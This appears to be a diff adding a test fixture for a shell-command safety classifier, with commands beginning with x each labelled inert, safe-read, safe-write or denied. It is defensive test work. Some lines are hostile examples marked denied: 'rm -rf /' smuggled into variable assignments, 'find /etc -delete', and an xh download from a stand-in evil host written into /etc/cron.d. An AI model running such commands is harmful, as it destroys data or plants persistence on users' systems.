@@ -1,0 +1,1444 @@
+x=	inert
+x="$(rm -rf /)"	denied
+x="foo bar"	inert
+x=$((1 + 2))	inert
+x=$y	inert
+x=${y}	inert
+x='foo bar'	inert
+x=1	inert
+x=1 && ls	inert
+x=1 && rm -rf /	denied
+x=1 > /dev/null	inert
+x=1 > file.txt	safe-write
+x=1 | rm -rf /	denied
+x=1; echo $x	inert
+x=1; rm -rf /	denied
+x=`rm -rf /`	denied
+x=foo$(rm -rf /)	denied
+xar	denied
+xar --coalesce-heap	safe-write
+xar --coalesce-heap --compression x	safe-write
+xar --coalesce-heap --distribution	safe-write
+xar --coalesce-heap x	safe-write
+xar --compression x	safe-write
+xar --compression-args x	safe-write
+xar --distribution	safe-write
+xar --dump-header	safe-write
+xar --dump-toc x	safe-write
+xar --dump-toc-cksum	safe-write
+xar --exclude x	safe-write
+xar --extract-subdoc x	safe-write
+xar --file-cksum x	safe-write
+xar --help	denied
+xar --keep-existing	safe-write
+xar --keep-setuid	safe-write
+xar --link-same	safe-write
+xar --list-subdocs x	safe-write
+xar --no-compress x	safe-write
+xar --prop-exclude x	safe-write
+xar --prop-include x	safe-write
+xar --rsize x	safe-write
+xar --toc-cksum x	safe-write
+xar --version	denied
+xar -C	safe-write
+xar -P	safe-write
+xar -a	safe-write
+xar -c	safe-write
+xar -f	safe-write
+xar -j	safe-write
+xar -k	safe-write
+xar -l	safe-write
+xar -p	safe-write
+xar -s	safe-write
+xar -t	safe-write
+xar -v	safe-write
+xar -x	safe-write
+xar -x -f file.xar	safe-write
+xar -z	safe-write
+xar x	safe-write
+xargs	inert
+xargs --help	denied
+xargs --version	denied
+xargs --xyzzy cat	denied
+xargs -0 grep foo	denied
+xargs -I X rm X	denied
+xargs -I {} cat {}	denied
+xargs -I {} rm {}	denied
+xargs -I{} basename {}	inert
+xargs -I{} rm -rf {}.bak	denied
+xargs -I{} rm -rf {}/sub	denied
+xargs -I{} rm {}	denied
+xargs bash -c 'git status'	inert
+xargs bash -c 'ls && rm -rf /'	denied
+xargs cat	denied
+xargs curl	denied
+xargs find . -name '*.py'	inert
+xargs find /etc -delete	denied
+xargs grep pattern	denied
+xargs npx cowsay	denied
+xargs npx eslint src/	safe-read
+xargs rm	denied
+xargs rm -rf --version	denied
+xargs sed 's/foo/bar/'	denied
+xargs sed -i 's/foo/bar/'	denied
+xargs sort -o out.txt	denied
+xargs x	denied
+xattr	denied
+xattr --help	inert
+xattr --help -c	safe-write
+xattr --help x	inert
+xattr --version	denied
+xattr -c	safe-write
+xattr -d	safe-write
+xattr -h	inert
+xattr -l	inert
+xattr -p	inert
+xattr -r	inert
+xattr -s	inert
+xattr -v	inert
+xattr -w	safe-write
+xattr -x	inert
+xattr file.txt	inert
+xattr x	inert
+xcbeautify	inert
+xcbeautify --help	inert
+xcbeautify --help --is-ci	inert
+xcbeautify --help --renderer x	inert
+xcbeautify --help x	inert
+xcbeautify --is-ci	inert
+xcbeautify --quiet	inert
+xcbeautify --quieter	inert
+xcbeautify --renderer x	inert
+xcbeautify --version	inert
+xcbeautify -V	inert
+xcbeautify -h	inert
+xcbeautify -q	inert
+xcbeautify x	inert
+xccov	denied
+xccov --help	inert
+xccov --version	denied
+xccov diff	denied
+xccov diff --help	inert
+xccov diff --help --json	inert
+xccov diff --help --path-equivalence x	inert
+xccov diff --help x	inert
+xccov diff --json	inert
+xccov diff --path-equivalence x	inert
+xccov diff -h	inert
+xccov diff old.xccovreport new.xccovreport	inert
+xccov diff x	inert
+xccov merge	denied
+xccov merge --help	inert
+xccov merge --help --outArchive x	safe-write
+xccov merge --help -h	denied
+xccov merge --help x	denied
+xccov merge --outArchive	safe-write
+xccov merge --outArchive --help	safe-write
+xccov merge --outArchive --outArchive x	safe-write
+xccov merge --outArchive --outReport x	safe-write
+xccov merge --outArchive -h	safe-write
+xccov merge --outArchive x	safe-write
+xccov merge --outReport	safe-write
+xccov merge --outReport x	safe-write
+xccov merge -h	inert
+xccov merge a.xccovreport b.xccovreport	denied
+xccov merge x	denied
+xccov view	denied
+xccov view --archive	inert
+xccov view --archive --file x	inert
+xccov view --archive --file-list	inert
+xccov view --archive Coverage.xccovarchive	inert
+xccov view --archive x	inert
+xccov view --file x	inert
+xccov view --file-list	inert
+xccov view --files-for-target x	inert
+xccov view --functions-for-file x	inert
+xccov view --help	inert
+xccov view --json	inert
+xccov view --json Coverage.xccovreport	inert
+xccov view --only-targets	inert
+xccov view --report	inert
+xccov view -h	inert
+xccov view Coverage.xccovreport	inert
+xccov view x	inert
+xccov x	denied
+xclip	safe-read
+xclip --help	safe-read
+xclip --help --version	safe-read
+xclip --help -display x	safe-read
+xclip --help x	safe-read
+xclip --version	safe-read
+xclip -d	safe-read
+xclip -display	safe-read
+xclip -display x	safe-read
+xclip -f	safe-read
+xclip -filter	safe-read
+xclip -h	safe-read
+xclip -help	safe-read
+xclip -i	safe-read
+xclip -in	safe-read
+xclip -l	safe-read
+xclip -loops	safe-read
+xclip -loops x	safe-read
+xclip -o	safe-read
+xclip -out	safe-read
+xclip -quiet	safe-read
+xclip -rmlastnl	safe-read
+xclip -selection x	safe-read
+xclip -silent	safe-read
+xclip -target	safe-read
+xclip -target x	safe-read
+xclip -v	safe-read
+xclip -verbose	safe-read
+xclip x	safe-read
+xcode-select	denied
+xcode-select --help	inert
+xcode-select --help --print-path	denied
+xcode-select --help x	denied
+xcode-select --print-path	inert
+xcode-select --version	inert
+xcode-select -V	inert
+xcode-select -h	inert
+xcode-select -p	inert
+xcode-select -v	inert
+xcode-select x	denied
+xcodebuild	denied
+xcodebuild --help	safe-write
+xcodebuild --help --version	safe-write
+xcodebuild --help -arch x	safe-write
+xcodebuild --help x	safe-write
+xcodebuild --version	safe-write
+xcodebuild -V	safe-write
+xcodebuild -allowProvisioningDeviceRegistration	safe-write
+xcodebuild -allowProvisioningUpdates	safe-write
+xcodebuild -alltargets	safe-write
+xcodebuild -arch x	safe-write
+xcodebuild -archivePath x	safe-write
+xcodebuild -buildVersion x	safe-write
+xcodebuild -checkFirstLaunchStatus	safe-write
+xcodebuild -configuration x	safe-write
+xcodebuild -defaultLanguage x	safe-write
+xcodebuild -defaultPackageRegistryURL x	safe-write
+xcodebuild -derivedDataPath x	safe-write
+xcodebuild -destination x	safe-write
+xcodebuild -destination-timeout x	safe-write
+xcodebuild -disableAutomaticPackageResolution	safe-write
+xcodebuild -disablePackageRepositoryCache	safe-write
+xcodebuild -dry-run	safe-write
+xcodebuild -enableAddressSanitizer	safe-write
+xcodebuild -enableCodeCoverage	safe-write
+xcodebuild -enableThreadSanitizer	safe-write
+xcodebuild -enableUndefinedBehaviorSanitizer	safe-write
+xcodebuild -exportArchive x	safe-write
+xcodebuild -exportFormat x	safe-write
+xcodebuild -exportLanguage x	safe-write
+xcodebuild -exportLocalizations x	safe-write
+xcodebuild -exportNotarizedApp x	safe-write
+xcodebuild -exportOptionsPlist x	safe-write
+xcodebuild -exportPath x	safe-write
+xcodebuild -find-executable x	safe-write
+xcodebuild -find-library x	safe-write
+xcodebuild -h	safe-write
+xcodebuild -hideShellScriptEnvironment	safe-write
+xcodebuild -importComponent x	safe-write
+xcodebuild -importLocalizations x	safe-write
+xcodebuild -importPath x	safe-write
+xcodebuild -jobs x	safe-write
+xcodebuild -json	safe-write
+xcodebuild -license	safe-write
+xcodebuild -list	safe-write
+xcodebuild -list -project Foo.xcodeproj	safe-write
+xcodebuild -localizationPath x	safe-write
+xcodebuild -maximum-concurrent-test-device-destinations x	safe-write
+xcodebuild -maximum-concurrent-test-simulator-destinations x	safe-write
+xcodebuild -maximum-parallel-testing-workers x	safe-write
+xcodebuild -only-testing x	safe-write
+xcodebuild -only-testing:TEST-IDENTIFIER x	safe-write
+xcodebuild -onlyTesting x	safe-write
+xcodebuild -onlyUsePackageVersionsFromResolvedFile	safe-write
+xcodebuild -packageAuthorizationProvider x	safe-write
+xcodebuild -packageCachePath x	safe-write
+xcodebuild -packageDependencySCMToRegistryTransformation x	safe-write
+xcodebuild -packageFingerprintPolicy x	safe-write
+xcodebuild -packageSigningEntityPolicy x	safe-write
+xcodebuild -parallel-testing-enabled x	safe-write
+xcodebuild -parallel-testing-worker-count x	safe-write
+xcodebuild -parallelizeTargets	safe-write
+xcodebuild -prepareDeviceSupport x	safe-write
+xcodebuild -project Foo.xcodeproj -scheme Foo -configuration Debug -destination 'platform=macOS' build CODE_SIGNING_ALLOWED=NO CODE_SIGNING_REQUIRED=NO CODE_SIGN_IDENTITY=""	safe-write
+xcodebuild -project Foo.xcodeproj -scheme Foo -configuration Debug build	safe-write
+xcodebuild -project Foo.xcodeproj -scheme Foo -list	safe-write
+xcodebuild -project Foo.xcodeproj -scheme Foo analyze	safe-write
+xcodebuild -project Foo.xcodeproj -scheme Foo build	safe-write
+xcodebuild -project Foo.xcodeproj -scheme Foo clean	safe-write
+xcodebuild -project Foo.xcodeproj -scheme Foo docbuild	safe-write
+xcodebuild -project Foo.xcodeproj -scheme Foo test -destination 'platform=iOS Simulator,name=iPhone 15' -enableCodeCoverage	safe-write
+xcodebuild -project x	safe-write
+xcodebuild -quiet	safe-write
+xcodebuild -resolvePackageDependencies	safe-write
+xcodebuild -resultBundlePath x	safe-write
+xcodebuild -resultBundleVersion x	safe-write
+xcodebuild -resultStreamPath x	safe-write
+xcodebuild -retry-tests-on-failure x	safe-write
+xcodebuild -runDestination x	safe-write
+xcodebuild -runDestinationTimeout x	safe-write
+xcodebuild -runFirstLaunch	safe-write
+xcodebuild -scheme x	safe-write
+xcodebuild -scmProvider x	safe-write
+xcodebuild -sdk x	safe-write
+xcodebuild -showBuildSettings	safe-write
+xcodebuild -showBuildSettingsForIndex	safe-write
+xcodebuild -showComponent	safe-write
+xcodebuild -showFirstLaunchExperience	safe-write
+xcodebuild -showPartialBuildSettings	safe-write
+xcodebuild -showTestPlans	safe-write
+xcodebuild -showdestinations	safe-write
+xcodebuild -showdestinations -project Foo.xcodeproj -scheme Foo	safe-write
+xcodebuild -showsdks	safe-write
+xcodebuild -skip-testing x	safe-write
+xcodebuild -skip-testing:TEST-IDENTIFIER x	safe-write
+xcodebuild -skipMacroValidation	safe-write
+xcodebuild -skipPackagePluginValidation	safe-write
+xcodebuild -skipPackageSignatureValidation	safe-write
+xcodebuild -skipPackageUpdates	safe-write
+xcodebuild -skipTesting x	safe-write
+xcodebuild -skipUnavailableActions	safe-write
+xcodebuild -target x	safe-write
+xcodebuild -test-enumeration-format x	safe-write
+xcodebuild -test-enumeration-output-path x	safe-write
+xcodebuild -test-enumeration-style x	safe-write
+xcodebuild -test-iterations x	safe-write
+xcodebuild -test-repetition-relaunch-enabled x	safe-write
+xcodebuild -test-timeouts-enabled x	safe-write
+xcodebuild -testLanguage x	safe-write
+xcodebuild -testPlan x	safe-write
+xcodebuild -testProductsPath x	safe-write
+xcodebuild -testRegion x	safe-write
+xcodebuild -toolchain x	safe-write
+xcodebuild -usePackageSupportBuiltinSCM	safe-write
+xcodebuild -verbose	safe-write
+xcodebuild -version	safe-write
+xcodebuild -workspace Foo.xcworkspace -scheme Foo -configuration Release archive -archivePath build/Foo.xcarchive	safe-write
+xcodebuild -workspace x	safe-write
+xcodebuild -xcconfig x	safe-write
+xcodebuild -xctestrun x	safe-write
+xcodebuild x	safe-write
+xcodegen	denied
+xcodegen --help	inert
+xcodegen --help --version	denied
+xcodegen --help x	denied
+xcodegen --version	inert
+xcodegen -V	inert
+xcodegen -h	inert
+xcodegen dump	inert
+xcodegen dump --help	inert
+xcodegen dump --help --no-env	inert
+xcodegen dump --help --project-root x	inert
+xcodegen dump --help x	inert
+xcodegen dump --no-env	inert
+xcodegen dump --project-root x	inert
+xcodegen dump --quiet	inert
+xcodegen dump --spec project.yml --type json	inert
+xcodegen dump --spec x	inert
+xcodegen dump --type x	inert
+xcodegen dump -h	inert
+xcodegen dump -n	inert
+xcodegen dump -q	inert
+xcodegen dump -r x	inert
+xcodegen dump -s x	inert
+xcodegen dump -t x	inert
+xcodegen dump x	inert
+xcodegen evil-sub	denied
+xcodegen generate	safe-write
+xcodegen generate --cache-path x	safe-write
+xcodegen generate --evil	denied
+xcodegen generate --help	safe-write
+xcodegen generate --help --cache-path x	safe-write
+xcodegen generate --help --no-env	safe-write
+xcodegen generate --help x	safe-write
+xcodegen generate --no-env	safe-write
+xcodegen generate --only-plists	safe-write
+xcodegen generate --project x	safe-write
+xcodegen generate --project-root x	safe-write
+xcodegen generate --quiet	safe-write
+xcodegen generate --quiet --use-cache	safe-write
+xcodegen generate --spec project.yml	safe-write
+xcodegen generate --spec x	safe-write
+xcodegen generate --use-cache	safe-write
+xcodegen generate -c	safe-write
+xcodegen generate -h	safe-write
+xcodegen generate -n	safe-write
+xcodegen generate -p x	safe-write
+xcodegen generate -q	safe-write
+xcodegen generate -r x	safe-write
+xcodegen generate -s project.yml -p out/	safe-write
+xcodegen generate -s x	safe-write
+xcodegen generate x	safe-write
+xcodegen version	inert
+xcodegen version --help	inert
+xcodegen version --help -h	inert
+xcodegen version --help x	inert
+xcodegen version -h	inert
+xcodegen version x	inert
+xcodegen x	denied
+xcresulttool	denied
+xcresulttool --help	inert
+xcresulttool --output-path x	denied
+xcresulttool --version	denied
+xcresulttool compare	denied
+xcresulttool compare --analyzer-issues	inert
+xcresulttool compare --analyzer-issues --baseline-path x	inert
+xcresulttool compare --analyzer-issues --build-warnings	inert
+xcresulttool compare --analyzer-issues x	inert
+xcresulttool compare --baseline-path x	inert
+xcresulttool compare --build-warnings	inert
+xcresulttool compare --compact	inert
+xcresulttool compare --help	inert
+xcresulttool compare --legacy	inert
+xcresulttool compare --schema	inert
+xcresulttool compare --schema-version x	inert
+xcresulttool compare --summary	inert
+xcresulttool compare --test-failures	inert
+xcresulttool compare --tests	inert
+xcresulttool compare -h	inert
+xcresulttool compare x	inert
+xcresulttool export	denied
+xcresulttool export --help	safe-write
+xcresulttool export --help --id x	safe-write
+xcresulttool export --help --legacy	safe-write
+xcresulttool export --help x	safe-write
+xcresulttool export --id x	safe-write
+xcresulttool export --legacy	safe-write
+xcresulttool export --output-path x	safe-write
+xcresulttool export --path x	safe-write
+xcresulttool export --type x	safe-write
+xcresulttool export -h	safe-write
+xcresulttool export x	safe-write
+xcresulttool formatDescription	denied
+xcresulttool formatDescription --format json	inert
+xcresulttool formatDescription --format x	inert
+xcresulttool formatDescription --hash	inert
+xcresulttool formatDescription --hash --format x	inert
+xcresulttool formatDescription --hash --help	inert
+xcresulttool formatDescription --hash x	inert
+xcresulttool formatDescription --help	inert
+xcresulttool formatDescription --include-event-stream-types	inert
+xcresulttool formatDescription --legacy	inert
+xcresulttool formatDescription -h	inert
+xcresulttool formatDescription x	inert
+xcresulttool get	denied
+xcresulttool get --compact	inert
+xcresulttool get --compact --format x	inert
+xcresulttool get --compact --help	inert
+xcresulttool get --compact x	inert
+xcresulttool get --format x	inert
+xcresulttool get --help	inert
+xcresulttool get --id x	inert
+xcresulttool get --legacy	inert
+xcresulttool get --path Run.xcresult	inert
+xcresulttool get --path Run.xcresult --id abc	inert
+xcresulttool get --path x	inert
+xcresulttool get --schema	inert
+xcresulttool get --schema-version x	inert
+xcresulttool get --test-id x	inert
+xcresulttool get --type x	inert
+xcresulttool get -h	inert
+xcresulttool get x	inert
+xcresulttool graph	denied
+xcresulttool graph --help	inert
+xcresulttool graph --help --path x	inert
+xcresulttool graph --help -h	inert
+xcresulttool graph --help x	inert
+xcresulttool graph --path Run.xcresult	inert
+xcresulttool graph --path x	inert
+xcresulttool graph -h	inert
+xcresulttool graph x	inert
+xcresulttool merge	denied
+xcresulttool merge --help	safe-write
+xcresulttool merge --help --output-path x	safe-write
+xcresulttool merge --help -h	safe-write
+xcresulttool merge --help x	safe-write
+xcresulttool merge --output-path x	safe-write
+xcresulttool merge -h	safe-write
+xcresulttool merge x	safe-write
+xcresulttool metadata	inert
+xcresulttool metadata addExternalLocation	denied
+xcresulttool metadata addExternalLocation --path Run.xcresult	denied
+xcresulttool metadata addExternalLocation x	denied
+xcresulttool metadata get	denied
+xcresulttool metadata get --help	inert
+xcresulttool metadata get --help --path x	inert
+xcresulttool metadata get --help -h	inert
+xcresulttool metadata get --help x	inert
+xcresulttool metadata get --path Run.xcresult	inert
+xcresulttool metadata get --path x	inert
+xcresulttool metadata get -h	inert
+xcresulttool metadata get x	inert
+xcresulttool metadata x	denied
+xcresulttool version	inert
+xcresulttool version --help	inert
+xcresulttool version --help -h	inert
+xcresulttool version --help x	denied
+xcresulttool version -h	inert
+xcresulttool version x	denied
+xcresulttool x	denied
+xcrun	denied
+xcrun --find	denied
+xcrun --find x	inert
+xcrun --help	inert
+xcrun --help --log	inert
+xcrun --help --sdk x	inert
+xcrun --help x	denied
+xcrun --log	denied
+xcrun --no-cache	denied
+xcrun --sdk x	denied
+xcrun --show-sdk-build-version	inert
+xcrun --show-sdk-build-version x	inert
+xcrun --show-sdk-path	inert
+xcrun --show-sdk-path x	inert
+xcrun --show-sdk-platform-path	inert
+xcrun --show-sdk-platform-path x	inert
+xcrun --show-sdk-platform-version	inert
+xcrun --show-sdk-platform-version x	inert
+xcrun --show-sdk-version	inert
+xcrun --show-sdk-version x	inert
+xcrun --show-toolchain-path	inert
+xcrun --show-toolchain-path x	inert
+xcrun --toolchain x	denied
+xcrun --verbose	denied
+xcrun --version	inert
+xcrun -h	inert
+xcrun -l	denied
+xcrun -n	denied
+xcrun -v	denied
+xcrun actool	denied
+xcrun actool x	safe-write
+xcrun agvtool	denied
+xcrun agvtool x	denied
+xcrun altool	denied
+xcrun altool x	denied
+xcrun codesign	denied
+xcrun codesign x	denied
+xcrun devicectl	denied
+xcrun devicectl device install app --device 00008132-0001 /tmp/My.app	denied
+xcrun devicectl x	denied
+xcrun ibtool	denied
+xcrun ibtool x	safe-write
+xcrun iphoneos	denied
+xcrun iphoneos x	denied
+xcrun lipo	denied
+xcrun lipo x	denied
+xcrun notarytool	denied
+xcrun notarytool x	denied
+xcrun pkgutil	denied
+xcrun pkgutil x	denied
+xcrun plutil	denied
+xcrun plutil x	denied
+xcrun simctl	denied
+xcrun simctl x	denied
+xcrun spctl	denied
+xcrun spctl x	denied
+xcrun stapler	denied
+xcrun stapler x	denied
+xcrun swift	denied
+xcrun swift x	denied
+xcrun x	denied
+xcrun xcodebuild	denied
+xcrun xcodebuild x	safe-write
+xcrun xcresulttool	denied
+xcrun xcresulttool x	denied
+xcrun xctest	denied
+xcrun xctest x	safe-read
+xcrun xctrace	denied
+xcrun xctrace x	denied
+xctest	denied
+xctest --help	denied
+xctest --version	denied
+xctest -XCTest TestClass/testMethod /tmp/MyTests.xctest	safe-read
+xctest -XCTest x	safe-read
+xctest /tmp/MyTests.xctest	safe-read
+xctest x	safe-read
+xctrace	denied
+xctrace --help	inert
+xctrace --input x	denied
+xctrace --output x	denied
+xctrace --version	denied
+xctrace export	denied
+xctrace export --har	inert
+xctrace export --har --help	inert
+xctrace export --har --input x	inert
+xctrace export --har x	inert
+xctrace export --help	inert
+xctrace export --input Run.trace --output trace.har --har	inert
+xctrace export --input x	inert
+xctrace export --output x	inert
+xctrace export --quiet	inert
+xctrace export --toc	inert
+xctrace export --xpath x	inert
+xctrace export -h	inert
+xctrace export x	inert
+xctrace help	inert
+xctrace help record	inert
+xctrace help x	inert
+xctrace import	denied
+xctrace import --help	safe-write
+xctrace import --help --input x	safe-write
+xctrace import --help --quiet	safe-write
+xctrace import --help x	safe-write
+xctrace import --input trace.ktrace --output Run.trace	safe-write
+xctrace import --input x	safe-write
+xctrace import --instrument x	safe-write
+xctrace import --output x	safe-write
+xctrace import --package x	safe-write
+xctrace import --quiet	safe-write
+xctrace import --template x	safe-write
+xctrace import -h	safe-write
+xctrace import x	safe-write
+xctrace list	denied
+xctrace list --help	inert
+xctrace list --help --quiet	denied
+xctrace list --help x	denied
+xctrace list --quiet	denied
+xctrace list -h	inert
+xctrace list devices	inert
+xctrace list devices --help	inert
+xctrace list instruments	inert
+xctrace list instruments --help	inert
+xctrace list templates	inert
+xctrace list templates --help	inert
+xctrace list x	denied
+xctrace record	denied
+xctrace record --launch /usr/bin/yes	denied
+xctrace record x	denied
+xctrace remodel	denied
+xctrace remodel --input Run.trace	denied
+xctrace remodel x	denied
+xctrace symbolicate	denied
+xctrace symbolicate --dsym x	safe-write
+xctrace symbolicate --help	safe-write
+xctrace symbolicate --help --dsym x	safe-write
+xctrace symbolicate --help --quiet	safe-write
+xctrace symbolicate --help x	safe-write
+xctrace symbolicate --input Run.trace --output Symbolicated.trace	safe-write
+xctrace symbolicate --input x	safe-write
+xctrace symbolicate --output x	safe-write
+xctrace symbolicate --quiet	safe-write
+xctrace symbolicate -h	safe-write
+xctrace symbolicate x	safe-write
+xctrace version	inert
+xctrace version --help	inert
+xctrace version --help -h	inert
+xctrace version --help x	denied
+xctrace version -h	inert
+xctrace version x	denied
+xctrace x	denied
+xelatex	denied
+xelatex --cnf-line	safe-write
+xelatex --cnf-line --cnf-line x	safe-write
+xelatex --cnf-line --draftmode	safe-write
+xelatex --cnf-line x	safe-write
+xelatex --draftmode	safe-write
+xelatex --enc	safe-write
+xelatex --enc x	safe-write
+xelatex --etex	safe-write
+xelatex --file-line-error	safe-write
+xelatex --file-line-error-style	safe-write
+xelatex --fmt	safe-write
+xelatex --fmt x	safe-write
+xelatex --halt-on-error	safe-write
+xelatex --halt-on-error x	safe-write
+xelatex --help	safe-write
+xelatex --ini	safe-write
+xelatex --initialize	safe-write
+xelatex --interaction	safe-write
+xelatex --interaction x	safe-write
+xelatex --ipc	safe-write
+xelatex --ipc-start	safe-write
+xelatex --jobname x	safe-write
+xelatex --kanji x	safe-write
+xelatex --kanji-internal x	safe-write
+xelatex --mktex	safe-write
+xelatex --mktex x	safe-write
+xelatex --mltex x	safe-write
+xelatex --no-cnf	safe-write
+xelatex --no-file-line-error	safe-write
+xelatex --no-mktex	safe-write
+xelatex --no-mktex x	safe-write
+xelatex --no-parse-first-line	safe-write
+xelatex --no-shell-escape	safe-write
+xelatex --no-shell-escape x	safe-write
+xelatex --output-comment x	safe-write
+xelatex --output-directory x	safe-write
+xelatex --output-format x	safe-write
+xelatex --parse-first-line	safe-write
+xelatex --progname	safe-write
+xelatex --progname x	safe-write
+xelatex --recorder	safe-write
+xelatex --recorder x	safe-write
+xelatex --restricted-shell-escape	safe-write
+xelatex --shell-escape x	safe-write
+xelatex --shell-restricted	safe-write
+xelatex --shell-restricted x	safe-write
+xelatex --show-version	safe-write
+xelatex --src-specials	safe-write
+xelatex --src-specials x	safe-write
+xelatex --synctex	safe-write
+xelatex --synctex x	safe-write
+xelatex --translate-file	safe-write
+xelatex --translate-file x	safe-write
+xelatex --version	safe-write
+xelatex -help	safe-write
+xelatex -version	safe-write
+xelatex x	safe-write
+xgettext	denied
+xgettext --default-domain x	safe-write
+xgettext --directory x	safe-write
+xgettext --files-from x	safe-write
+xgettext --from-code x	safe-write
+xgettext --help	safe-write
+xgettext --help --default-domain x	safe-write
+xgettext --help --join-existing	safe-write
+xgettext --help x	safe-write
+xgettext --join-existing	safe-write
+xgettext --keyword x	safe-write
+xgettext --language x	safe-write
+xgettext --output x	safe-write
+xgettext --output-dir x	safe-write
+xgettext --version	safe-write
+xgettext -D x	safe-write
+xgettext -L x	safe-write
+xgettext -d x	safe-write
+xgettext -f x	safe-write
+xgettext -j	safe-write
+xgettext -k x	safe-write
+xgettext -o x	safe-write
+xgettext -p x	safe-write
+xgettext x	safe-write
+xgettext.pl	denied
+xgettext.pl --default-domain x	safe-write
+xgettext.pl --directory x	safe-write
+xgettext.pl --files-from x	safe-write
+xgettext.pl --gnu-gettext	safe-write
+xgettext.pl --gnu-gettext --default-domain x	safe-write
+xgettext.pl --gnu-gettext --help	safe-write
+xgettext.pl --gnu-gettext x	safe-write
+xgettext.pl --help	safe-write
+xgettext.pl --no-warnings	safe-write
+xgettext.pl --output x	safe-write
+xgettext.pl --output-dir x	safe-write
+xgettext.pl --plugin x	safe-write
+xgettext.pl --use-gettext-style	safe-write
+xgettext.pl --verbose	safe-write
+xgettext.pl --version	denied
+xgettext.pl --wrap	safe-write
+xgettext.pl -D x	safe-write
+xgettext.pl -P x	safe-write
+xgettext.pl -W	safe-write
+xgettext.pl -d x	safe-write
+xgettext.pl -f x	safe-write
+xgettext.pl -g	safe-write
+xgettext.pl -h	safe-write
+xgettext.pl -now	safe-write
+xgettext.pl -o messages.po lib/Foo.pm	safe-write
+xgettext.pl -o x	safe-write
+xgettext.pl -p x	safe-write
+xgettext.pl -u	safe-write
+xgettext.pl -v	safe-write
+xgettext.pl x	safe-write
+xh	denied
+xh --all	safe-read
+xh --all --auth x	safe-read
+xh --all --auth-type	safe-read
+xh --all x	safe-read
+xh --auth x	safe-read
+xh --auth-type	safe-read
+xh --auth-type x	safe-read
+xh --bearer	safe-read
+xh --bearer x	safe-read
+xh --body	safe-read
+xh --cert x	safe-read
+xh --cert-key x	safe-read
+xh --check-status	safe-read
+xh --continue	safe-read
+xh --curl	safe-read
+xh --curl-long	safe-read
+xh --debug	safe-read
+xh --download	safe-read
+xh --follow	safe-read
+xh --form	safe-read
+xh --headers	safe-read
+xh --help	safe-read
+xh --ignore-netrc	safe-read
+xh --ignore-stdin	safe-read
+xh --insecure	safe-read
+xh --json	safe-read
+xh --max-redirects x	safe-read
+xh --multipart	safe-read
+xh --no-style	safe-read
+xh --offline	safe-read
+xh --output x	safe-read
+xh --overwrite	safe-read
+xh --print	safe-read
+xh --print x	safe-read
+xh --proxy x	safe-read
+xh --quiet	safe-read
+xh --raw	safe-read
+xh --read-config x	safe-read
+xh --session x	safe-read
+xh --session-read-only x	safe-read
+xh --ssl x	safe-read
+xh --stream	safe-read
+xh --style	safe-read
+xh --style x	safe-read
+xh --timeout x	safe-read
+xh --verbose	safe-read
+xh --verify x	safe-read
+xh --version	safe-read
+xh -?	safe-read
+xh -A	safe-read
+xh -A x	safe-read
+xh -F	safe-read
+xh -I	safe-read
+xh -S	safe-read
+xh -a x	safe-read
+xh -b	safe-read
+xh -c	safe-read
+xh -d	safe-read
+xh -f	safe-read
+xh -h	safe-read
+xh -j	safe-read
+xh -m	safe-read
+xh -o	safe-read
+xh -o x	safe-read
+xh -o/etc/cron.d/job http://evil	denied
+xh -p	safe-read
+xh -p x	safe-read
+xh -q	safe-read
+xh -s	safe-read
+xh -v	safe-read
+xh x	safe-read
+xip	denied
+xip --expand archive.xip	safe-write
+xip --expand x	safe-write
+xip --help	safe-write
+xip --help --expand x	safe-write
+xip --help -h	safe-write
+xip --help x	safe-write
+xip --version	denied
+xip -h	safe-write
+xip x	safe-write
+xmake	denied
+xmake --help	inert
+xmake --help --version	denied
+xmake --help x	denied
+xmake --version	inert
+xmake -h	inert
+xmake -v	inert
+xmake b	denied
+xmake b x	denied
+xmake build	denied
+xmake build x	denied
+xmake clean	denied
+xmake clean x	denied
+xmake config	denied
+xmake config x	denied
+xmake create	denied
+xmake create x	denied
+xmake f	denied
+xmake f x	denied
+xmake format	denied
+xmake format x	denied
+xmake global	denied
+xmake global x	denied
+xmake help	inert
+xmake help x	inert
+xmake info	denied
+xmake info --help	safe-read
+xmake info --help -h	safe-read
+xmake info --help x	safe-read
+xmake info -h	safe-read
+xmake info x	safe-read
+xmake install	denied
+xmake install x	denied
+xmake lint	safe-read
+xmake lint --diagnosis	safe-read
+xmake lint --diagnosis --help	safe-read
+xmake lint --diagnosis x	safe-read
+xmake lint --help	safe-read
+xmake lint --quiet	safe-read
+xmake lint --verbose	safe-read
+xmake lint -D	safe-read
+xmake lint -h	safe-read
+xmake lint -q	safe-read
+xmake lint -v	safe-read
+xmake lint x	safe-read
+xmake lua	denied
+xmake lua --help	safe-read
+xmake lua --help -h	safe-read
+xmake lua --help x	safe-read
+xmake lua -h	safe-read
+xmake lua x	safe-read
+xmake macro	denied
+xmake macro x	denied
+xmake package	denied
+xmake package x	denied
+xmake project	denied
+xmake project x	denied
+xmake r	denied
+xmake r x	denied
+xmake repo	denied
+xmake repo x	denied
+xmake require	denied
+xmake require x	denied
+xmake run	denied
+xmake run x	denied
+xmake service	denied
+xmake service x	denied
+xmake show	safe-read
+xmake show --config x	safe-read
+xmake show --help	safe-read
+xmake show --help --config x	safe-read
+xmake show --help -h	safe-read
+xmake show --help x	safe-read
+xmake show --list x	safe-read
+xmake show -h	safe-read
+xmake show -l x	safe-read
+xmake show x	safe-read
+xmake test	denied
+xmake test x	denied
+xmake uninstall	denied
+xmake uninstall x	denied
+xmake update	denied
+xmake update x	denied
+xmake upgrade	denied
+xmake upgrade x	denied
+xmake watch	denied
+xmake watch x	denied
+xmake x	denied
+xmlcatalog	denied
+xmlcatalog --add x	safe-read
+xmlcatalog --create	safe-read
+xmlcatalog --create --add x	safe-read
+xmlcatalog --create --noout	safe-read
+xmlcatalog --create x	safe-read
+xmlcatalog --del x	safe-read
+xmlcatalog --help	denied
+xmlcatalog --noout	safe-read
+xmlcatalog --sgml	safe-read
+xmlcatalog --shell	safe-read
+xmlcatalog --verbose	safe-read
+xmlcatalog --version	denied
+xmlcatalog -v	safe-read
+xmlcatalog x	safe-read
+xmllint	denied
+xmllint --auto	inert
+xmllint --auto --catalogs	inert
+xmllint --auto --dtdvalid x	inert
+xmllint --auto x	inert
+xmllint --catalogs	inert
+xmllint --compress	inert
+xmllint --copy	inert
+xmllint --debug	inert
+xmllint --debugent	inert
+xmllint --dropdtd	inert
+xmllint --dtdvalid x	inert
+xmllint --dtdvalidfpi x	inert
+xmllint --encode x	inert
+xmllint --format	inert
+xmllint --help	inert
+xmllint --html	inert
+xmllint --htmlout	inert
+xmllint --huge	inert
+xmllint --load-trace	inert
+xmllint --loaddtd	inert
+xmllint --maxmem x	inert
